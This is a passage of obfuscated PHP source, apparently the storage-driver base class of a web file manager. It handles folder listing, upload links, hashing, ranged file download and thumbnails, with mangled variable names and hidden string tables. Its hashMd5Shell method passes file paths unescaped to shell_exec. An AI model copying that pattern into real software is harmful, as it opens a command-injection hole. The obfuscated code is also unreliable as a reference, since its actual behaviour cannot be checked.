$this->info($­¤Ş×Ã); } public function infoAuth($Ö®¶ú) { return $this->info($Ö®¶ú); } public function infoFull($í‚åéŠÑ) { return $this->info($í‚åéŠÑ); } public function infoFullSimple($£ÅÃÌæ) { return $this->info($£ÅÃÌæ); } public function infoWithChildren($ùÕô„“ı) { $±ùÒ÷åı =& $_SERVER[ò«¥Ê‡å]; static $º¹¿©½Á = array(); if (isset($º¹¿©½Á[$ùÕô„“ı])) { return $º¹¿©½Á[$ùÕô„“ı]; } $«åâ–œä = $this->info($ùÕô„“ı); if ($«åâ–œä && $«åâ–œä[$±ùÒ÷åı[33]] == $±ùÒ÷åı[77]) { $³æÛ€´« = array($±ùÒ÷åı[78] => 0, $±ùÒ÷åı[79] => 0, $±ùÒ÷åı[80] => 0); $this->infoChildren($ùÕô„“ı, $³æÛ€´«); $«åâ–œä[$±ùÒ÷åı[78]] = $³æÛ€´«[$±ùÒ÷åı[78]]; $«åâ–œä[$±ùÒ÷åı[81]] = array($±ùÒ÷åı[82] => $³æÛ€´«[$±ùÒ÷åı[79]], $±ùÒ÷åı[83] => $³æÛ€´«[$±ùÒ÷åı[80]]); $º¹¿©½Á[$ùÕô„“ı] = $«åâ–œä; } return $«åâ–œä; } public function listPath($³õ®ñÙ®, $Ñ ­ŠÁÑ = false) { } public function has($âˆÑõŠş, $Œ‰èµ‘ = false, $ØÜíë„ = false) { } public function canRead($îºêãÍñ) { } public function canWrite($“İ˜ŞÔ§) { } public function getContent($™Ì—ïú¦) { } public function setContent($³Åª¤£é, $ªÑãØ¤÷ = '') { } protected function infoChildren($µôÔáÄ, &$¿ù„€Å’) { $¢è¬ç† =& $_SERVER[ò«¥Ê‡å]; check_abort_echo(); $†ôîÏÛ¨ = $this->listPath($µôÔáÄ, !0); $†ôîÏÛ¨ = array_merge($†ôîÏÛ¨[$¢è¬ç†[84]], $†ôîÏÛ¨[$¢è¬ç†[85]]); foreach ($†ôîÏÛ¨ as $³ÎÂÕ §) { if ($³ÎÂÕ §[$¢è¬ç†[33]] == $¢è¬ç†[77]) { $¿ù„€Å’[$¢è¬ç†[80]]++; $ºœˆ×é = $this->getPathInner($³ÎÂÕ §[$¢è¬ç†[86]]); $this->infoChildren($ºœˆ×é, $¿ù„€Å’); } else { $¿ù„€Å’[$¢è¬ç†[79]]++; $¿ù„€Å’[$¢è¬ç†[78]] += $³ÎÂÕ §[$¢è¬ç†[78]]; } } } public function fileSubstr($Ìñ¬œ©°, $¹™êáŒ, $ÂóµÈó¦) { } public function listAll($´ûÓëíÏ) { } public function listAllMake($ûÀÔŒ…ê, &$›ÉÍŒÔÒ) { $Å¨ñŞŠÎ =& $_SERVER[ò«¥Ê‡å]; check_abort_echo(); $ö–î¦Û‚ = $this->listPath($ûÀÔŒ…ê, !0); if (!$ö–î¦Û‚) { return; } $«ñÜóÔè = array_merge($ö–î¦Û‚[$Å¨ñŞŠÎ[84]], $ö–î¦Û‚[$Å¨ñŞŠÎ[85]]); foreach ($«ñÜóÔè as $ô¹˜‰ı¥) { $¸‘½ä×¬ = $ô¹˜‰ı¥[$Å¨ñŞŠÎ[33]] == $Å¨ñŞŠÎ[77]; $«ê…ë = array($Å¨ñŞŠÎ[86] => $ô¹˜‰ı¥[$Å¨ñŞŠÎ[86]], $Å¨ñŞŠÎ[77] => $¸‘½ä×¬); if (isset($ô¹˜‰ı¥[$Å¨ñŞŠÎ[78]])) { $«ê…ë[$Å¨ñŞŠÎ[78]] = $ô¹˜‰ı¥[$Å¨ñŞŠÎ[78]]; } if (isset($ô¹˜‰ı¥[$Å¨ñŞŠÎ[87]])) { $«ê…ë[$Å¨ñŞŠÎ[87]] = $ô¹˜‰ı¥[$Å¨ñŞŠÎ[87]]; } if (!$¸‘½ä×¬) { $›ÉÍŒÔÒ[] = $«ê…ë; continue; } $›ÉÍŒÔÒ[] = $«ê…ë; $Š–ääŒ = $ô¹˜‰ı¥[$Å¨ñŞŠÎ[86]]; $µ±’ß¡ü = $this->pathDriver; if (substr($ô¹˜‰ı¥[$Å¨ñŞŠÎ[86]], 0, strlen($µ±’ß¡ü)) == $µ±’ß¡ü) { $Š–ääŒ = substr($Š–ääŒ, strlen($µ±’ß¡ü)); } $this->listAllMake($Š–ääŒ, $›ÉÍŒÔÒ); } } public function listAllSimple($Šƒ¾¹ú–, $ÇÆÍÛÅ– = false) { $ã™´—— = $this->listAll($Šƒ¾¹ú–); return $this->listAllSimpleMake($ã™´——, $this->getPathOuter($Šƒ¾¹ú–), $ÇÆÍÛÅ–); } public function listAllSimpleMake($Æ®°„üö, $¾’„·Ğ‹, $³å‡‰Ë) { $¢™”í±Ì =& $_SERVER[ò«¥Ê‡å]; $Ñƒ¦åüõ = array(); $¾’„·Ğ‹ = rtrim(get_path_father($¾’„·Ğ‹), $¢™”í±Ì[8]) . $¢™”í±Ì[8]; foreach ($Æ®°„üö as $€Ò°¿°‰) { $©¾¦æ¨¿ = array($¢™”í±Ì[86] => $€Ò°¿°‰[$¢™”í±Ì[86]], $¢™”í±Ì[88] => $€Ò°¿°‰[$¢™”í±Ì[86]], $¢™”í±Ì[77] => $€Ò°¿°‰[$¢™”í±Ì[77]]); if (isset($€Ò°¿°‰[$¢™”í±Ì[78]]) && !$€Ò°¿°‰[$¢™”í±Ì[77]]) { $©¾¦æ¨¿[$¢™”í±Ì[78]] = $€Ò°¿°‰[$¢™”í±Ì[78]]; } if (isset($€Ò°¿°‰[$¢™”í±Ì[87]])) { $©¾¦æ¨¿[$¢™”í±Ì[87]] = $€Ò°¿°‰[$¢™”í±Ì[87]]; } if (is_array($€Ò°¿°‰[$¢™”í±Ì[89]])) { $©¾¦æ¨¿[$¢™”í±Ì[88]] = $€Ò°¿°‰[$¢™”í±Ì[89]][$¢™”í±Ì[86]]; $©¾¦æ¨¿[$¢™”í±Ì[78]] = $€Ò°¿°‰[$¢™”í±Ì[89]][$¢™”í±Ì[78]]; $©¾¦æ¨¿[$¢™”í±Ì[87]] = $€Ò°¿°‰[$¢™”í±Ì[89]][$¢™”í±Ì[87]]; } else { if (substr($€Ò°¿°‰[$¢™”í±Ì[86]], 0, strlen($¾’„·Ğ‹)) == $¾’„·Ğ‹) { $©¾¦æ¨¿[$¢™”í±Ì[86]] = substr($€Ò°¿°‰[$¢™”í±Ì[86]], strlen($¾’„·Ğ‹)); } } $ŞÇ—·Úì = $€Ò°¿°‰[$¢™”í±Ì[77]] ? $¢™”í±Ì[8] : $¢™”í±Ì[12]; $©¾¦æ¨¿[$¢™”í±Ì[88]] = rtrim($©¾¦æ¨¿[$¢™”í±Ì[88]], $¢™”í±Ì[8]) . $ŞÇ—·Úì; $©¾¦æ¨¿[$¢™”í±Ì[86]] = $¢™”í±Ì[8] . trim($©¾¦æ¨¿[$¢™”í±Ì[86]], $¢™”í±Ì[8]) . $ŞÇ—·Úì; if (!$³å‡‰Ë) { $áï¨È« = explode($¢™”í±Ì[8], trim($©¾¦æ¨¿[$¢™”í±Ì[86]], $¢™”í±Ì[8])); $©¾¦æ¨¿[$¢™”í±Ì[86]] = $¢™”í±Ì[8] . implode($¢™”í±Ì[8], array_slice($áï¨È«, 1)) . $ŞÇ—·Úì; } $Ñƒ¦åüõ[] = $©¾¦æ¨¿; } return array_sort_by($Ñƒ¦åüõ, $¢™”í±Ì[86]); } public function upload($á‡Ò”›, $ÑßÕÎæ™, $üÍ‰¨Ì± = false, $™ ª‰–Í = REPEAT_REPLACE) { } public function uploadFileByID($È¿ç«Ïë, $ÀÆºêİÔ, $ù®²Ëˆõ) { } public function uploadFileByPath($Ëşİ¶å÷, $ä¯Œ¨Û², $´İÜšÓ˜ = array()) { } public function isUploadServer() { $¹¬ãİœÂ =& $_SERVER[ò«¥Ê‡å]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $¹¬ãİœÂ[90]) { return !0; } return $GLOBALS[$¹¬ãİœÂ[6]][$¹¬ãİœÂ[91]][$¹¬ãİœÂ[92]]; } public function isFileOutServer() { $Ìôñê³ˆ =& $_SERVER[ò«¥Ê‡å]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Ìôñê³ˆ[90]) { return !0; } return $GLOBALS[$Ìôñê³ˆ[6]][$Ìôñê³ˆ[91]][$Ìôñê³ˆ[93]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($ÎÓŒ¡È¤) { $üÓĞÜ¾í =& $_SERVER[ò«¥Ê‡å]; if (!$this->isCdnHost()) { return $ÎÓŒ¡È¤; } return str_replace(trim(get_url_root($ÎÓŒ¡È¤), $üÓĞÜ¾í[8]), trim($this->cdnHost, $üÓĞÜ¾í[8]), $ÎÓŒ¡È¤); } public function uploadLink($ş·â«Ö, $¹Â›Ù‘Í = 0) { $²¾œº×Â =& $_SERVER[ò«¥Ê‡å]; if ($this->isUploadServer()) { return; } $ •‰¡Ùß = $this->getType(); if (!in_array($ •‰¡Ùß, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ŞÙ…÷ûè = 1024 * 1024 * 10; $¡«Ã¤Ö¸ = $¹Â›Ù‘Í <= $ŞÙ…÷ûè ? $²¾œº×Â[94] : $²¾œº×Â[95]; $ûî´éï‡ = (!$¹Â›Ù‘Í ? 1 : ceil($¹Â›Ù‘Í / pow(1024, 3))) * 3600 * 4; $ğ¦ùöıã = $this->{$¡«Ã¤Ö¸}($ş·â«Ö, $ûî´éï‡); if ($ğ¦ùöıã) { $ğ¦ùöıã[$²¾œº×Â[96]] = $ş·â«Ö; $ğ¦ùöıã[$²¾œº×Â[97]] = $ •‰¡Ùß; } return $ğ¦ùöıã; } public function uploadFormData($Ü…ìäÆñ, $çú›¡æ¯ = 3600) { } public function multiUploadFormData($äıâ¦§², $éÙ“Ë¢Ä = 3600) { } public function download($˜ßÏÏåİ, $îÔ´·¨Ã) { } public function ext($÷Òı´÷ƒ) { $éÛÇ™ÜÅ =& $_SERVER[ò«¥Ê‡å]; if (strpos($÷Òı´÷ƒ, $éÛÇ™ÜÅ[8]) === -1) { $º¿ÌÊ = $÷Òı´÷ƒ; } else { $º¿ÌÊ = $this->pathThis($÷Òı´÷ƒ); } $ıèè…½ô = $éÛÇ™ÜÅ[12]; if (strstr($º¿ÌÊ, $éÛÇ™ÜÅ[10])) { $ıèè…½ô = substr($º¿ÌÊ, strrpos($º¿ÌÊ, $éÛÇ™ÜÅ[10]) + 1); $ıèè…½ô = strtolower($ıèè…½ô); } if (strlen($ıèè…½ô) > 3 && preg_match($éÛÇ™ÜÅ[98], $ıèè…½ô, $ïúñüÚ›)) { $ıèè…½ô = $éÛÇ™ÜÅ[12]; } return $ıèè…½ô; } public function pathThis($ó¡ÉëÔ) { $—ÚĞƒØ =& $_SERVER[ò«¥Ê‡å]; $ó¡ÉëÔ = str_replace($—ÚĞƒØ[99], $—ÚĞƒØ[8], rtrim($ó¡ÉëÔ, $—ÚĞƒØ[8])); $Ô¤ˆÌÁ® = strrpos($ó¡ÉëÔ, $—ÚĞƒØ[8]); if ($Ô¤ˆÌÁ® === !1) { return $ó¡ÉëÔ; } return substr($ó¡ÉëÔ, $Ô¤ˆÌÁ® + 1); } public function pathFather($µù¬İÁŞ) { $»•‰ØñÀ =& $_SERVER[ò«¥Ê‡å]; $µù¬İÁŞ = str_replace($»•‰ØñÀ[99], $»•‰ØñÀ[8], rtrim($µù¬İÁŞ, $»•‰ØñÀ[8])); $„ ŒÄî = strrpos($µù¬İÁŞ, $»•‰ØñÀ[8]); if ($„ ŒÄî === !1) { return $»•‰ØñÀ[12]; } return substr($µù¬İÁŞ, 0, $„ ŒÄî + 1); } public function hashSimple($€Œ»âñ) { $Ÿ¢Œ»” =& $_SERVER[ò«¥Ê‡å]; if (!$€Œ»âñ) { return md5($Ÿ¢Œ»”[12]); } $êø¦å³Ø = $this->size($€Œ»âñ); $üé™Êñ” = 200; $Á²†¯ = 50; if ($êø¦å³Ø <= $üé™Êñ” * $Á²†¯) { return $this->hashMd5($€Œ»âñ) . $êø¦å³Ø; } $Òà¢’ı = intval($êø¦å³Ø / $Á²†¯); $¼è—Œ÷ = $Ÿ¢Œ»”[12]; for ($°ã‡Í® = 0; $°ã‡Í® < $Á²†¯; $°ã‡Í®++) { $¼è—Œ÷ .= $this->fileSubstr($€Œ»âñ, $Òà¢’ı * $°ã‡Í®, $üé™Êñ”); } $¼è—Œ÷ .= $this->fileSubstr($€Œ»âñ, $êø¦å³Ø - $üé™Êñ”, $üé™Êñ”); return md5($¼è—Œ÷) . $êø¦å³Ø; } public static $md5Cache = array(); public function hashMd5($‡üÑ¤™µ) { if (!$‡üÑ¤™µ) { return md5($_SERVER[ò«¥Ê‡å][12]); } $‡üÑ¤™µ = $this->iconvSystem($‡üÑ¤™µ); if (isset(self::$md5Cache[$‡üÑ¤™µ])) { return self::$md5Cache[$‡üÑ¤™µ]; } self::$md5Cache[$‡üÑ¤™µ] = $this->hashMd5Shell($‡üÑ¤™µ); if (!self::$md5Cache[$‡üÑ¤™µ]) { self::$md5Cache[$‡üÑ¤™µ] = @md5_file($‡üÑ¤™µ); } return self::$md5Cache[$‡üÑ¤™µ]; } private function hashMd5Shell($÷æ›Û²) { $ëÔ•ó˜ =& $_SERVER[ò«¥Ê‡å]; if (!$÷æ›Û²) { return md5($ëÔ•ó˜[12]); } if (!function_exists($ëÔ•ó˜[100])) { return !1; } $É¬œ†ôÜ = array($ëÔ•ó˜[101], $ëÔ•ó˜[102]); $“Øáåá´ = Cache::get($ëÔ•ó˜[103]); if (!$“Øáåá´) { $Ô”ñ“İ = BASIC_PATH . $ëÔ•ó˜[104]; $¥å»²š« = md5_file($Ô”ñ“İ); $“Øáåá´ = $ëÔ•ó˜[105]; foreach ($É¬œ†ôÜ as $˜’í¹Èó) { $Ê‚Œ´é = shell_exec($˜’í¹Èó . "\x20\42{$Ô”ñ“İ}\x22"); if ($Ê‚Œ´é && substr(trim($Ê‚Œ´é), 0, 32) == $¥å»²š«) { $“Øáåá´ = $˜’í¹Èó; break; } } Cache::set($ëÔ•ó˜[103], $“Øáåá´, 3600); } if ($“Øáåá´ == $ëÔ•ó˜[105]) { return !1; } $Ê‚Œ´é = shell_exec($“Øáåá´ . "\x20\x22{$÷æ›Û²}\42"); $Ê‚Œ´é = str_replace($ëÔ•ó˜[106], $ëÔ•ó˜[12], $Ê‚Œ´é); return substr($Ê‚Œ´é, 0, 32); } public function link($ ÂÊÔç) { return $ ÂÊÔç; } public function fileOut($İš›Å¸¤, $•›†ÛÃ = false, $­ÙÄÆ¢Ù = false, $‰ÓÂÇ¼ = '') { $Î»­ÇŸÁ =& $_SERVER[ò«¥Ê‡å]; $this->cacheMethod(null, null); if (!$İš›Å¸¤ || !$this->exist($İš›Å¸¤)) { show_json(LNG($Î»­ÇŸÁ[107]), !1, $­ÙÄÆ¢Ù); } $¢ÄÎ™¨µ = $this->getType() == $Î»­ÇŸÁ[108]; $œ¢ƒúË = $GLOBALS[$Î»­ÇŸÁ[6]][$Î»­ÇŸÁ[91]][$Î»­ÇŸÁ[109]][$Î»­ÇŸÁ[110]]; $¨¿º‰©‚ = (double) $GLOBALS[$Î»­ÇŸÁ[6]][$Î»­ÇŸÁ[91]][$Î»­ÇŸÁ[109]][$Î»­ÇŸÁ[111]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $Óï ´èä = $this->infoFull($İš›Å¸¤); $ÆŠéúø„ = $Óï ´èä[$Î»­ÇŸÁ[78]]; $äæ«ÆÒ = gmdate($Î»­ÇŸÁ[112], $Óï ´èä[$Î»­ÇŸÁ[87]]); $êÆÜ§Ôƒ = $­ÙÄÆ¢Ù ? $­ÙÄÆ¢Ù : $this->iconvApp($Óï ´èä[$Î»­ÇŸÁ[32]]); $•÷š¾µÔ = 0; $¢­¬Àô— = $ÆŠéúø„ - 1; $ŸÁ‡šòÊ = $this->ext($êÆÜ§Ôƒ); if (in_array($ŸÁ‡šòÊ, array($Î»­ÇŸÁ[113], $Î»­ÇŸÁ[114], $Î»­ÇŸÁ[115], $Î»­ÇŸÁ[116]))) { $ŸÁ‡šòÊ = $Î»­ÇŸÁ[117]; } if (in_array($ŸÁ‡šòÊ, array($Î»­ÇŸÁ[118]))) { $ŸÁ‡šòÊ = $Î»­ÇŸÁ[119]; } if (!$‰ÓÂÇ¼) { $‰ÓÂÇ¼ = md5($äæ«ÆÒ . $ÆŠéúø„); } $‰ÓÂÇ¼ = $Î»­ÇŸÁ[120] . $‰ÓÂÇ¼ . $Î»­ÇŸÁ[120]; $Ùı³Ñ“ = get_file_mime($ŸÁ‡šòÊ); $ğÓÈÕ = !0; $ğÓÈÕ = isset($_GET[$Î»­ÇŸÁ[121]]) ? !1 : !0; if ($•›†ÛÃ === !1 && !mime_support($Ùı³Ñ“)) { $Ùı³Ñ“ = $Î»­ÇŸÁ[122]; } header($Î»­ÇŸÁ[123]); header($Î»­ÇŸÁ[124] . $Ùı³Ñ“); $‘Îº°„Í = rawurlencode($êÆÜ§Ôƒ); $‘Îº°„Í = $Î»­ÇŸÁ[120] . $‘Îº°„Í . $Î»­ÇŸÁ[125] . $‘Îº°„Í; if ($•›†ÛÃ) { header($Î»­ÇŸÁ[126]); header($Î»­ÇŸÁ[127] . $‘Îº°„Í); } else { if ($ğÓÈÕ) { header($Î»­ÇŸÁ[128] . $‘Îº°„Í); } } header($Î»­ÇŸÁ[129] . gmdate($Î»­ÇŸÁ[112], time() + 3600 * 24 * 30) . $Î»­ÇŸÁ[130]); header($Î»­ÇŸÁ[131]); header($Î»­ÇŸÁ[132]); header($Î»­ÇŸÁ[133]); if (isset($_SERVER[$Î»­ÇŸÁ[134]]) && strtotime($_SERVER[$Î»­ÇŸÁ[134]]) == $Óï ´èä[$Î»­ÇŸÁ[87]]) { header($Î»­ÇŸÁ[135], !0, 304); die; } if (isset($_SERVER[$Î»­ÇŸÁ[136]]) && $_SERVER[$Î»­ÇŸÁ[136]] == $‰ÓÂÇ¼) { header($Î»­ÇŸÁ[137] . $‰ÓÂÇ¼, !0, 304); die; } header($Î»­ÇŸÁ[137] . $‰ÓÂÇ¼); header($Î»­ÇŸÁ[138] . $äæ«ÆÒ . $Î»­ÇŸÁ[130]); header($Î»­ÇŸÁ[139] . $êÆÜ§Ôƒ); header($Î»­ÇŸÁ[140]); header($Î»­ÇŸÁ[141] . $ÆŠéúø„); header($Î»­ÇŸÁ[142]); Hook::trigger($Î»­ÇŸÁ[143], $İš›Å¸¤, $ÆŠéúø„, $êÆÜ§Ôƒ, $ŸÁ‡šòÊ); if (!$•›†ÛÃ && $ŸÁ‡šòÊ == $Î»­ÇŸÁ[144]) { if ($ÆŠéúø„ > 1024 * 1024 * 5) { die; } $§‚¶Á = $this->getContent($İš›Å¸¤); $§‚¶Á = Html::clearSVG($§‚¶Á); header($Î»­ÇŸÁ[145] . strlen($§‚¶Á)); echo $§‚¶Á; die; } $»¹ÂÁø = strtolower($_SERVER[$Î»­ÇŸÁ[146]]); if ($¢ÄÎ™¨µ && $»¹ÂÁø && $œ¢ƒúË) { if (strstr($»¹ÂÁø, $Î»­ÇŸÁ[147])) { header($Î»­ÇŸÁ[148] . $İš›Å¸¤); } else { if (strstr($»¹ÂÁø, $Î»­ÇŸÁ[149])) { header($Î»­ÇŸÁ[150] . $İš›Å¸¤); } else { if (strstr($»¹ÂÁø, $Î»­ÇŸÁ[151])) { header($Î»­ÇŸÁ[152] . $İš›Å¸¤); } } } if ($¨¿º‰©‚) { header($Î»­ÇŸÁ[153] . $¨¿º‰©‚); } return; } if (isset($_SERVER[$Î»­ÇŸÁ[154]])) { if (preg_match($Î»­ÇŸÁ[155], $_SERVER[$Î»­ÇŸÁ[154]], $İ ùú)) { $•÷š¾µÔ = intval($İ ùú[1]); $•÷š¾µÔ = $•÷š¾µÔ <= 0 ? 0 : ($•÷š¾µÔ >= $¢­¬Àô— ? $¢­¬Àô— : $•÷š¾µÔ); if (!empty($İ ùú[2])) { $ô™Ã¾¯² = intval($İ ùú[2]); $¢­¬Àô— = $ô™Ã¾¯² < $•÷š¾µÔ ? $•÷š¾µÔ : ($ô™Ã¾¯² >= $¢­¬Àô— ? $¢­¬Àô— : $ô™Ã¾¯²); } } header($Î»­ÇŸÁ[156]); header("\103\x6f\156\164\x65\x6e\x74\55\x52\x61\156\x67\145\x3a\40\x62\x79\164\x65\x73\40{$•÷š¾µÔ}\55{$¢­¬Àô—}\57" . $ÆŠéúø„); } else { header($Î»­ÇŸÁ[157]); } header($Î»­ÇŸÁ[158]); $Ï–†ºİ = !0; if ($_SERVER[$Î»­ÇŸÁ[159]] == $Î»­ÇŸÁ[160] && $ÆŠéúø„ > 1204 * 1024 * 1024 * 2) { $Ï–†ºİ = !1; } if ($Ï–†ºİ) { header($Î»­ÇŸÁ[161] . ($¢­¬Àô— - $•÷š¾µÔ + 1)); } if ($_SERVER[$Î»­ÇŸÁ[162]] == $Î»­ÇŸÁ[163]) { return; } $ùƒŸÚ¶¸ = 1024 * 100; $¿şóù…Ò = 0; if ($¨¿º‰©‚) { $¿şóù…Ò = intval(1000 * 1000 * ($ùƒŸÚ¶¸ / $¨¿º‰©‚)); } while ($•÷š¾µÔ <= $¢­¬Àô—) { $ÛûÜéÒ = timeFloat(); check_abort(); $Ğ­ÎÒã = $¢­¬Àô— - $•÷š¾µÔ + 1; if ($Ğ­ÎÒã <= $ùƒŸÚ¶¸) { $ùƒŸÚ¶¸ = $Ğ­ÎÒã; } echo $this->fileSubstr($İš›Å¸¤, $•÷š¾µÔ, $ùƒŸÚ¶¸); $•÷š¾µÔ += $ùƒŸÚ¶¸; if ($ùƒŸÚ¶¸ == $Ğ­ÎÒã) { $•÷š¾µÔ = $¢­¬Àô— + 1; } if ($¿şóù…Ò) { $ƒŠÄÌËŞ = intval(1000 * 1000 * (timeFloat() - $ÛûÜéÒ)); $†ÌÍ±ô¯ = $¿şóù…Ò - $ƒŠÄÌËŞ; if ($†ÌÍ±ô¯ > 5) { usleep($†ÌÍ±ô¯); } } } } public function fileOutServer($Å©Éğ‚Ô, $Ü‚ñµòŠ = false, $ãÚÄÇ÷ó = false, $‘ìÂ› = '') { $this->fileOut($Å©Éğ‚Ô, $Ü‚ñµòŠ, $ãÚÄÇ÷ó, $‘ìÂ›); } public function fileOutLink($˜»×çÆ¸) { header($_SERVER[ò«¥Ê‡å][164] . $˜»×çÆ¸); die; } public function cacheMethod($ÈÑ…ÓÛÛ, $Õ×ó‘¬´, $ØÔ¾Âˆ§ = null) { $¶ˆ™³ó =& $_SERVER[ò«¥Ê‡å]; static $ùšß–³˜ = array(); $ßŸã¾É× = $Õ×ó‘¬´ ? ltrim($this->getPathOuter($Õ×ó‘¬´), $¶ˆ™³ó[8]) : $¶ˆ™³ó[12]; $µûáš‘ = $¶ˆ™³ó[165] . $ÈÑ…ÓÛÛ . $¶ˆ™³ó[166] . rtrim($ßŸã¾É×, $¶ˆ™³ó[8]); if (is_null($ÈÑ…ÓÛÛ)) { $ùšß–³˜ = array(); return; } if (is_null($Õ×ó‘¬´)) { foreach ($ùšß–³˜ as $µûáš‘ => $µ¯şÃÖ) { if (!strstr($µûáš‘, $¶ˆ™³ó[165] . $ÈÑ…ÓÛÛ . $¶ˆ™³ó[167])) { continue; } unset($ùšß–³˜[$µûáš‘]); } return; } if (!is_null($ØÔ¾Âˆ§)) { $ùšß–³˜[$µûáš‘] = $ØÔ¾Âˆ§; return; } $Î—ª×“¾ = isset($ùšß–³˜[$µûáš‘]) ? $ùšß–³˜[$µûáš‘] : null; if (!is_null($Î—ª×“¾)) { return $Î—ª×“¾; } $Î—ª×“¾ = $this->{$ÈÑ…ÓÛÛ}($Õ×ó‘¬´); $ùšß–³˜[$µûáš‘] = $Î—ª×“¾; return $Î—ª×“¾; } public function cacheMethodInfoSet($Ù˜ı»ã™, $ëÑ §–´, $ÖÇüê¼¹ = false) { $´‚¾©Ã =& $_SERVER[ò«¥Ê‡å]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($´‚¾©Ã[168], $Ù˜ı»ã™, $ëÑ §–´); $this->cacheMethod($´‚¾©Ã[169], $Ù˜ı»ã™, $ëÑ §–´ ? !1 : !0); if (is_array($ÖÇüê¼¹)) { $this->cacheMethod($´‚¾©Ã[170], $Ù˜ı»ã™, $ÖÇüê¼¹); } } public function fileOutImage($ÏÔ÷õ³Ä, $É÷”Öù = 250) { $µ¼“êŸÓ =& $_SERVER[ò«¥Ê‡å]; set_timeout(); if (substr($ÏÔ÷õ³Ä, 0, 4) == $µ¼“êŸÓ[151]) { $this->fileOutLink($ÏÔ÷õ³Ä); } $˜ªÍ‡û = $this->info($ÏÔ÷õ³Ä); $ù¸êìß™ = !1; $õ÷ˆÂ¼Û = isset($GLOBALS[$µ¼“êŸÓ[171]]) ? $GLOBALS[$µ¼“êŸÓ[171]] : array(); if ($õ÷ˆÂ¼Û && $õ÷ˆÂ¼Û[$µ¼“êŸÓ[172]] == $˜ªÍ‡û[$µ¼“êŸÓ[86]]) { $˜ªÍ‡û = $õ÷ˆÂ¼Û; $‰íÅëúµ = $˜ªÍ‡û[$µ¼“êŸÓ[173]]; if ($‰íÅëúµ && isset($‰íÅëúµ[$µ¼“êŸÓ[174]])) { if ($‰íÅëúµ[$µ¼“êŸÓ[174]] <= $É÷”Öù && $‰íÅëúµ[$µ¼“êŸÓ[175]] <= $É÷”Öù) { $ù¸êìß™ = !0; } } } if ($˜ªÍ‡û[$µ¼“êŸÓ[78]] <= 1024 * 50 || $ù¸êìß™ || !function_exists($µ¼“êŸÓ[176]) || $˜ªÍ‡û[$µ¼“êŸÓ[177]] == $µ¼“êŸÓ[178]) { return $this->fileOut($ÏÔ÷õ³Ä, !1, $˜ªÍ‡û[$µ¼“êŸÓ[32]]); } $¥¶Ñ£ºù = kodIO::hashPath($˜ªÍ‡û); $èŠ §î¿ = "\143\157\x76\x65\x72\x5f{$¥¶Ñ£ºù}\x5f{$É÷”Öù}\x2e\x70\x6e\x67"; $¶·öœ = IO_PATH_SYSTEM_TEMP . $µ¼“êŸÓ[179]; $‹çõàã = IO::infoFullSimple($¶·öœ); $ïŒÌñ± = $‹çõàã && is_array($‹çõàã) ? $‹çõàã[$µ¼“êŸÓ[86]] : $µ¼“êŸÓ[12]; if (!$ïŒÌñ±) { $ïŒÌñ± = IO::mkdir($¶·öœ); } if ($˜ªÍ‡û[$µ¼“êŸÓ[180]] == $µ¼“êŸÓ[181] && isset($˜ªÍ‡û[$µ¼“êŸÓ[182]]) && $˜ªÍ‡û[$µ¼“êŸÓ[182]] == kodIO::sourceID($ïŒÌñ±)) { $çËØ¨Äã = $˜ªÍ‡û[$µ¼“êŸÓ[183]]; if ($É÷”Öù <= 500) { $Ò…Éîûı = preg_replace($µ¼“êŸÓ[184], $µ¼“êŸÓ[185], $˜ªÍ‡û[$µ¼“êŸÓ[32]]); $çËØ¨Äã = IO::fileNameExist($ïŒÌñ±, $Ò…Éîûı); } return IO::fileOut(KodIO::make($çËØ¨Äã), !1, $˜ªÍ‡û[$µ¼“êŸÓ[32]]); } $ÜŒÀÀ”È = IO::fileNameExist($ïŒÌñ±, $èŠ §î¿); if ($ÜŒÀÀ”È) { return IO::fileOut(KodIO::make($ÜŒÀÀ”È), !1, $˜ªÍ‡û[$µ¼“êŸÓ[32]]); } if ($É÷”Öù > 1000) { $this->makeImageCover($ïŒÌñ±, $ÏÔ÷õ³Ä, $èŠ §î¿, $É÷”Öù); $this->makeImageCover($ïŒÌñ±, $ÏÔ÷õ³Ä, "\x63\157\x76\x65\162\x5f{$¥¶Ñ£ºù}\137\62\65\x30\x2e\160\156\147", 250); $ÜŒÀÀ”È = IO::fileNameExist($ïŒÌñ±, $èŠ §î¿); if ($ÜŒÀÀ”È) { return IO::fileOut(KodIO::make($ÜŒÀÀ”È), !1, $˜ªÍ‡û[$µ¼“êŸÓ[32]]); } die; } $¡¹œ¼› = Cache::get($èŠ §î¿); if ($¡¹œ¼› == $µ¼“êŸÓ[186] || $¡¹œ¼› == $µ¼“êŸÓ[187]) { echo $¡¹œ¼›; die; } Cache::set($èŠ §î¿, $µ¼“êŸÓ[187], 60); $¸óªû¡¶ = array($ïŒÌñ±, $˜ªÍ‡û[$µ¼“êŸÓ[86]], $èŠ §î¿, $É÷”Öù); $Ò‚”íË‰ = $µ¼“êŸÓ[188] . $˜ªÍ‡û[$µ¼“êŸÓ[78]] . $µ¼“êŸÓ[189] . $èŠ §î¿ . $µ¼“êŸÓ[190] . $˜ªÍ‡û[$µ¼“êŸÓ[32]] . $µ¼“êŸÓ[191] . $˜ªÍ‡û[$µ¼“êŸÓ[86]]; TaskQueue::add($µ¼“êŸÓ[192], $¸óªû¡¶, $Ò‚”íË‰, $èŠ §î¿); } public function makeImageCover($÷ÊÄçƒ—, $–¼”şæğ, $ßÊà×Œ§, $İ¨·İ) { $¨â©øä³ =& $_SERVER[ò«¥Ê‡å]; if (IO::fileNameExist($÷ÊÄçƒ—, $ßÊà×Œ§)) { return $¨â©øä³[193]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $é¿É’öœ = DATA_THUMB . $ßÊà×Œ§; del_file($é¿É’öœ); $¥åÙ™Å” = TEMP_FILES . $ßÊà×Œ§; if (!@file_exists($¥åÙ™Å”)) { $¥åÙ™Å” = $this->download($–¼”şæğ, $¥åÙ™Å”); } if (!@file_exists($¥åÙ™Å”)) { return $¨â©øä³[194]; } ImageThumb::createThumb($¥åÙ™Å”, $é¿É’öœ, $İ¨·İ, $İ¨·İ * 10); if (@file_exists($é¿É’öœ)) { Cache::remove($ßÊà×Œ§); return 